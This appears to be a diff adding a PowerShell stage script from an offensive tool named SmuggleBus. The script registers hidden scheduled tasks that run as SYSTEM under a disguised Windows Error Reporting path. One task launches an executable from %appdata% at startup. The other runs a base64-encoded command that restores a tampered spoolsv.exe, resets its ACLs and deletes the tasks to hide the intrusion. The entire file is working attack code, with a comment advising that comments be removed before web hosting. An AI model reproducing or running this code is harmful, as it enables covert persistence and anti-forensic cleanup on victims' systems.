@@ -1,0 +1,60 @@
+##############################
+### SmuggleBus Stage Code
+## For best results, remove comments before web hosting ;)
+#
+# Creating two scheduled tasks via PowerShell:
+#  Updater1 = payload
+#  Updater2 = clean-up, fixes the service and file ACLs, deletes the scheduled tasks used for code exec
+
+
+
+# Payload
+$A = New-ScheduledTaskAction -Execute '%appdata%\start.exe';
+$T = New-ScheduledTaskTrigger -AtStartup;
+$S = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable -Priority 0
+Register-ScheduledTask -Action $A -Trigger $T -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -Settings $S -TaskName 'Updater1' -TaskPath '\Microsoft\Windows\Windows Error Reporting\';
+Start-ScheduledTask -TaskName 'Updater1' -TaskPath '\Microsoft\Windows\Windows Error Reporting\';
+
+
+
+# Clean-up
+# 1. changing ACLs on hacked spoolsv.exe so that it can be deleted
+# 2. restoring the original spoolsv.exe binary and the original ACLs
+# 3. deleting the scheduled tasks
+# 4. starting the service, resuming normal operation
+#
+#
+#   Start-Sleep -Seconds 120;
+#   `$username = 'Everyone';
+#   `$path = 'C:\Windows\System32\spoolsv.exe';
+#   `$acl = (Get-Item `$path).GetAccessControl('Access');
+#   `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule(`$username, 'FullControl', 'None', 'None', 'Allow');
+#   `$acl.AddAccessRule(`$aclrule);
+#   set-acl -aclobject `$acl `$path;
+#   Remove-Item C:\windows\system32\spoolsv.exe;
+#   Copy-Item C:\Windows\System32\spoolsv.exe.bak C:\Windows\System32\spoolsv.exe;
+#   Remove-Item C:\Windows\System32\spoolsv.exe.bak;
+#   schtasks /delete /F /tn '\Microsoft\Windows\Windows Error Reporting\Updater1';
+#   schtasks /delete /F /tn '\Microsoft\Windows\Windows Error Reporting\Updater2';
+#   [System.Security.Principal.NTAccount]`$TrustedInstaller = 'NT SERVICE\TrustedInstaller';
+#   `$acl.SetOwner(`$TrustedInstaller);
+#   Set-Acl -Path `$path -AclObject `$acl;
+#   `$acl = Get-Acl `$path;
+#   `$sys = 'NT Authority\SYSTEM';
+#   `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule(`$sys, 'ReadAndexecute', 'None', 'None', 'Allow');
+#   `$acl.SetAccessRule(`$aclRule);
+#   Set-Acl -Path `$path -AclObject `$acl;
+#   `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'None', 'None', 'Allow');
+#   $acl = Get-Acl `$path;
+#   `$acl.RemoveAccessRule(`$aclRule);
+#   Set-Acl -Path `$path -AclObject `$acl;
+#   sc start spooler
+#
+
+#$A2 = New-ScheduledTaskAction -Execute 'powershell' -Argument "-command Start-Sleep -Seconds 120; `$username = 'Everyone'; `$path = 'C:\Windows\System32\spoolsv.exe'; `$acl = (Get-Item `$path).GetAccessControl('Access'); `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule(`$username, 'FullControl', 'None', 'None', 'Allow'); `$acl.AddAccessRule(`$aclrule); set-acl -aclobject `$acl `$path; Remove-Item C:\windows\system32\spoolsv.exe; Copy-Item C:\Windows\System32\spoolsv.exe.bak C:\Windows\System32\spoolsv.exe; Remove-Item C:\Windows\System32\spoolsv.exe.bak; schtasks /delete /F /tn '\Microsoft\Windows\Windows Error Reporting\Updater1'; schtasks /delete /F /tn '\Microsoft\Windows\Windows Error Reporting\Updater2'; [System.Security.Principal.NTAccount]`$TrustedInstaller = 'NT SERVICE\TrustedInstaller'; `$acl.SetOwner(`$TrustedInstaller); Set-Acl -Path `$path -AclObject `$acl; `$acl = Get-Acl `$path; `$sys = 'NT Authority\SYSTEM'; `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule(`$sys, 'ReadAndexecute', 'None', 'None', 'Allow'); `$acl.SetAccessRule(`$aclRule); Set-Acl -Path `$path -AclObject `$acl; `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'None', 'None', 'Allow'); $acl = Get-Acl `$path; `$acl.RemoveAccessRule(`$aclRule); Set-Acl -Path `$path -AclObject `$acl; sc start spooler"
+
+$A2 = New-ScheduledTaskAction -Execute 'powershell' -Argument "-EncodedCommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAyADAAOwAgACQAdQBzAGUAcgBuAGEAbQBlACAAPQAgACcARQB2AGUAcgB5AG8AbgBlACcAOwAgACQAcABhAHQAaAAgAD0AIAAnAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAcwB2AC4AZQB4AGUAJwA7ACAAJABhAGMAbAAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAcABhAHQAaAApAC4ARwBlAHQAQQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbAAoACcAQQBjAGMAZQBzAHMAJwApADsAIAAkAGEAYwBsAHIAdQBsAGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AcwBlAGMAdQByAGkAdAB5AC4AQQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbAAuAEYAaQBsAGUAUwB5AHMAdABlAG0AQQBjAGMAZQBzAHMAUgB1AGwAZQAoACQAdQBzAGUAcgBuAGEAbQBlACwAIAAnAEYAdQBsAGwAQwBvAG4AdAByAG8AbAAnACwAIAAnAE4AbwBuAGUAJwAsACAAJwBOAG8AbgBlACcALAAgACcAQQBsAGwAbwB3ACcAKQA7ACAAJABhAGMAbAAuAEEAZABkAEEAYwBjAGUAcwBzAFIAdQBsAGUAKAAkAGEAYwBsAHIAdQBsAGUAKQA7ACAAcwBlAHQALQBhAGMAbAAgAC0AYQBjAGwAbwBiAGoAZQBjAHQAIAAkAGEAYwBsACAAJABwAGEAdABoADsAIABSAGUAbQBvAHYAZQAtAEkAdABlAG0AIABDADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAcwBwAG8AbwBsAHMAdgAuAGUAeABlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAcwB2AC4AZQB4AGUALgBiAGEAawAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAcwB2AC4AZQB4AGUAOwAgAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABzAHAAbwBvAGwAcwB2AC4AZQB4AGUALgBiAGEAawA7ACAAcwBjAGgAdABhAHMAawBzACAALwBkAGUAbABlAHQAZQAgAC8ARgAgAC8AdABuACAAJwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFcAaQBuAGQAbwB3AHMAIABFAHIAcgBvAHIAIABSAGUAcABvAHIAdABpAG4AZwBcAFUAcABkAGEAdABlAHIAMQAnADsAIABzAGMAaAB0AGEAcwBrAHMAIAAvAGQAZQBsAGUAdABlACAALwBGACAALwB0AG4AIAAnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AZABvAHcAcwAgAEUAcgByAG8AcgAgAFIAZQBwAG8AcgB0AGkAbgBnAFwAVQBwAGQAYQB0AGUAcgAyACcAOwAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAE4AVABBAGMAYwBvAHUAbgB0AF0AJABUAHIAdQBzAHQAZQBkAEkAbgBzAHQAYQBsAGwAZQByACAAPQAgACcATgBUACAAUwBFAFIAVgBJAEMARQBcAFQAcgB1AHMAdABlAGQASQBuAHMAdABhAGwAbABlAHIAJwA7ACAAJABhAGMAbAAuAFMAZQB0AE8AdwBuAGUAcgAoACQAVAByAHUAcwB0AGUAZABJAG4AcwB0AGEAbABsAGUAcgApADsAIABTAGUAdAAtAEEAYwBsACAALQBQAGEAdABoACAAJABwAGEAdABoACAALQBBAGMAbABPAGIAagBlAGMAdAAgACQAYQBjAGwAOwAgACQAYQBjAGwAIAA9ACAARwBlAHQALQBBAGMAbAAgACQAcABhAHQAaAA7ACAAJABzAHkAcwAgAD0AIAAnAE4AVAAgAEEAdQB0AGgAbwByAGkAdAB5AFwAUwBZAFMAVABFAE0AJwA7ACAAJABhAGMAbAByAHUAbABlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABzAHkAcwB0AGUAbQAuAHMAZQBjAHUAcgBpAHQAeQAuAEEAYwBjAGUAcwBzAEMAbwBuAHQAcgBvAGwALgBGAGkAbABlAFMAeQBzAHQAZQBtAEEAYwBjAGUAcwBzAFIAdQBsAGUAKAAkAHMAeQBzACwAIAAnAFIAZQBhAGQAQQBuAGQAZQB4AGUAYwB1AHQAZQAnACwAIAAnAE4AbwBuAGUAJwAsACAAJwBOAG8AbgBlACcALAAgACcAQQBsAGwAbwB3ACcAKQA7ACAAJABhAGMAbAAuAFMAZQB0AEEAYwBjAGUAcwBzAFIAdQBsAGUAKAAkAGEAYwBsAFIAdQBsAGUAKQA7ACAAUwBlAHQALQBBAGMAbAAgAC0AUABhAHQAaAAgACQAcABhAHQAaAAgAC0AQQBjAGwATwBiAGoAZQBjAHQAIAAkAGEAYwBsADsAIAAkAGEAYwBsAHIAdQBsAGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AcwBlAGMAdQByAGkAdAB5AC4AQQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbAAuAEYAaQBsAGUAUwB5AHMAdABlAG0AQQBjAGMAZQBzAHMAUgB1AGwAZQAoACcARQB2AGUAcgB5AG8AbgBlACcALAAgACcARgB1AGwAbABDAG8AbgB0AHIAbwBsACcALAAgACcATgBvAG4AZQAnACwAIAAnAE4AbwBuAGUAJwAsACAAJwBBAGwAbABvAHcAJwApADsAIAAkAGEAYwBsACAAPQAgAEcAZQB0AC0AQQBjAGwAIAAkAHAAYQB0AGgAOwAgACQAYQBjAGwALgBSAGUAbQBvAHYAZQBBAGMAYwBlAHMAcwBSAHUAbABlACgAJABhAGMAbABSAHUAbABlACkAOwAgAFMAZQB0AC0AQQBjAGwAIAAtAFAAYQB0AGgAIAAkAHAAYQB0AGgAIAAtAEEAYwBsAE8AYgBqAGUAYwB0ACAAJABhAGMAbAA7ACAAcwBjACAAcwB0AGEAcgB0ACAAcwBwAG8AbwBsAGUAcgA="
+$T2 = New-ScheduledTaskTrigger -AtStartup;
+$S2 = New-ScheduledTaskSettingsSet -Hidden -Priority 0;
+Register-ScheduledTask -Action $A2 -Trigger $T2 -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -Settings $S2 -TaskName 'Updater2' -TaskPath '\Microsoft\Windows\Windows Error Reporting\';
+Start-ScheduledTask -TaskName 'Updater2' -TaskPath '\Microsoft\Windows\Windows Error Reporting\';
